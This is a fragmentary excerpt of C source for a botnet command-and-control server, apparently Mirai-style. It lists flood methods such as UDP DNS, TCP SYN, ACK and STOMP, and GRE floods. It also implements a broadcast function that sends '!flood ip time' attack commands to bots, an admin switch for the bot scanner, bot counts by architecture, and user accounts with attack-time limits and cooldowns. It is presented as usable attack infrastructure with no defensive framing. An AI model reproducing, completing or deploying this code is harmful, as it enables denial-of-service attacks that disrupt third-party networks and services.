...
#define ATK_MAXRUNNING  3
#define USER_COMMANDS   11
...
char *user_commands[USER_COMMANDS][2] = {
    ...
    {"udpvse", "valve source engine flood"},
    {"udpdns", "domain name server flood"},
    {"udpplain", "plain udp flood"},
    {"tcpsyn", "tcp SYN flood"},
    {"tcpack", "tcp ACK flood"},
    {"tcpstomp", "tcp STOMP flood"},
    {"greip", "greip flood"},
    {"greth", "greth flood"},
...
char *admin_commands[ADMIN_COMMANDS][2] = {
    ...
    {"scanner <enable/disable>", "enable or disable bot scanner"},
    {"botcount <-s/-e> <find>", "view the statistics of the bots (arguments are optional)"},
    {"users", "list the information about current new users"},
};
...
int broadcast_command(char *sendbuf, int maxcount, int maxtime, int myfd, char *floods, char *user, int admin_mode)
{
    if (attacking == 0)
    {
        write(myfd, "\x1b[31mThe admin has disabled attacks\r\n", strlen("\x1b[31mThe admin has disabled attacks\r\n"));
        return 0;
    }
    ...
    if ((args_len = split(tmpbuf, ' ', &arguments)) <= 2)
    {
        ...
        write(myfd, "\x1b[31mYour command is incorrectly formatted (!flood ip time [options])\r\n", strlen("\x1b[31mYour command is incorrectly formatted (!flood ip time [options])\r\n"));
        return 0;
    }
    ...
    if (arguments[0][0] == '-')
    {
        ...
        if ((newmax > maxcount || newmax < 1) && maxcount != -1)
        {
            ...
            free(arguments);
            memset(tmpbuf, 0, sizeof(tmpbuf));
            write(myfd, "\x1b[31mYou can not use more bots than you have access to\r\n", strlen("\x1b[31mYou can not use more bots than you have access to\r\n"));
            return 0;
        }
    ...
    if (arguments[0 + maxcnt])
    {
        ...
        if ((args2_len = split(floods, ',', &arguments2)) <= 0)
        {
            ...
            memset(tmpbuf, 0, sizeof(tmpbuf));
            free(arguments);
            write(myfd, "\x1b[31mUnknown error, please contact the admin\r\n", strlen("\x1b[31mUnknown error, please contact the admin\r\n"));
            return 0;
        }
        ...
        if (atk_found == 0)
        {
            ...
            memset(tmpbuf, 0, sizeof(tmpbuf));
            free(arguments);
            write(myfd, "\x1b[31mYour attack method is unknown\r\n", strlen("\x1b[31mYour attack method is unknown\r\n"));
            return 0;
        }
    ...
    if (arguments[2 + maxcnt])
    {
        ...
        if (atk_time > maxtime || atk_time > 86400)
        {
            ...
            memset(tmpbuf, 0, sizeof(tmpbuf));
            free(arguments);
            write(myfd, "\x1b[31mYou must stick within your attack time limit\r\n", strlen("\x1b[31mYou must stick within your attack time limit\r\n"));
            return 0;
        }
    }
    ...
    {
        close(fd);
        write(myfd, "\x1b[31mThe API has failed to build your command\r\n", strlen("\x1b[31mThe API has failed to build your command\r\n"));
        return 0;
    }
    ...
    if (sentto == 410)
    {
        sprintf(prompt, "\x1b[31mCan not start attacks with less than 1 bot\r\n");
        for (i = 0; i < args_len; i++)
            free(arguments[i]);
    ...
    else
    {
        ...
        sprintf(prompt, "\x1b[32mAttack command sent to %d bots (Started at %s)\r\n", sentto, ts);
    }
...
void *tab_title_admin(void *arg)
{
	...
	while (1)
	{
		...
		sprintf(title, "\033]0;%d Loaded | %d Users\007", botcount, operatorCount);
...
void userlist(int myfd)
{
    ...
    {
        write(myfd, "\x1b[31mFailed to open logins.txt\r\n", strlen("\x1b[31mFailed to open logins.txt\r\n"));
        return;
    }
...
void botcount(int myfd, int dofind, char *findstr)
{
    ...
    for (i = 0; i < q; i++)
    {
        ...
        if (dofind == 1)
        {
            ...
            {
                sprintf(sndbuf, "\x1b[92m%s\x1b[97m: %d\r\n", bot_entry[i].arch, bot_entry[i].count);
        ...
        else
        {
            ...
            {
                sprintf(sndbuf, "\x1b[92munknown\x1b[97m: %d\r\n", bot_entry[i].count);
                write(myfd, sndbuf, strlen(sndbuf));
                memset(sndbuf, 0, sizeof(sndbuf));
            }
            else
...
int valid_user(char *user, int myfd)
{
    ...
    if ((file_fd = open("logins.txt", O_RDONLY)) == -1)
    {
        write(myfd, "\x1b[31mYour account has been deleated, please contact the admin.\r\n", strlen("\x1b[31mYour account has been deleated, please contact the admin.\r\n"));
        return 0;
    }
...
void *controller_thread(void *arg)
{
	...
	while (memset(rdbuf, 0, sizeof(rdbuf)) && read_line(file_fd, rdbuf, sizeof(rdbuf)) != NULL)
	{
    		...
    		if (accinfo.attacktime < 1 || accinfo.attacktime > 86400)
    		{
    		    for (i = 0; i < args_len; i++)
    		        free(arguments[i]);
    		...
    		if (accinfo.cooldown < 1 || accinfo.cooldown > 86400)
    		{
    		    for (i = 0; i < args_len; i++)
    		        free(arguments[i]);
    ...
    write(accinfo.fd, "\033[?1049h\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n", strlen("\033[?1049h") + 16);
        ...
        sprintf(prompt, "\x1b[92m[%s\x1b[97m@\x1b[92mbotnet\x1b[92m]\033[0m ", username);
        write(accinfo.fd, prompt, strlen(prompt));
	...
	while (memset(rdbuf, 0, sizeof(rdbuf)) && read(accinfo.fd, rdbuf, sizeof(rdbuf)) > 0 && valid_user(accinfo.username, accinfo.fd) == 1)
	{
		...
		if (strlen(rdbuf) == 0)
		{
            if (last_spam + 2 > time(NULL))
                ...
                else
                {
                    ...
                    if (spam_detect >= 5)
                    {
                        write(accinfo.fd, "\x1b[31mYou have been detected spamming, verify the captcha to contiune\r\n", strlen("\x1b[31mYou have been detected spamming, verify the captcha to contiune\r\n"));
                        while (1)
                        {
                            ...
                            {
                                write(accinfo.fd, "\x1b[31mInvalid code please try again\r\n", strlen("\x1b[31mInvalid code please try again\r\n"));
                                sleep(1);
                                continue;
                            }
		...
		if (strcmp(rdbuf, "help") == 0 || strcmp(rdbuf, "?") == 0)
		{
            if (strcmp(accinfo.floods, "all") == 0)
            {
                ...
                {
                    char atk_help[128];
                        sprintf(atk_help, "\x1b[92m%s\x1b[97m: %s\r\n", user_commands[i][0], user_commands[i][1]);
            ...
            else
            {
                ...
                if ((args2_len = split(accinfo.floods, ',', &arguments2)) <= 0)
                {
                    ...
                    free(arguments2);
                    write(accinfo.fd, "\x1b[31mUnknown error, please contact the admin\r\n", strlen("\x1b[31mUnknown error, please contact the admin\r\n"));
                }
                ...
                if (atk_count == 0)
                    write(accinfo.fd, "\x1b[31mYou dont have access to any floods\r\n", strlen("\x1b[31mYou dont have access to any floods\r\n"));
		...
		{
            write(accinfo.fd, "\x1b[32mAttacks have been enabled\r\n", strlen("\x1b[32mAttacks have been enabled\r\n"));
            attacking = 1;
        }
        else if (strcmp(rdbuf, "attacks disable") == 0 && accinfo.admin == 1)
		{
            write(accinfo.fd, "\x1b[31mAttacks have been disabled\r\n", strlen("\x1b[31mAttacks have been disabled\r\n"));
            attacking = 0;
        }
        ...
        else if ((strcmp(rdbuf, "users") == 0 || strcmp(rdbuf, "userlist") == 0) && accinfo.admin == 1)
            userlist(accinfo.fd);
		else if (rdbuf[0] == '!')
        {
            ...
            {
                char cbuf[128];
                sprintf(cbuf, "\x1b[31m(1/1) Attacks ongoing please wait %ld more seconds\r\n", last_attack - time(NULL));
            ...
            else
            {
                if (strlen(rdbuf + 1) >= 512)
                    write(accinfo.fd, "\x1b[31mYour command is to long\r\n", strlen("\x1b[31mYour command is to long\r\n"));
                else
                {
                    int cooldown;
            ...
            write(accinfo.fd, "\x1b[31mCommand not found\r\n", strlen("\x1b[31mCommand not found\r\n"));
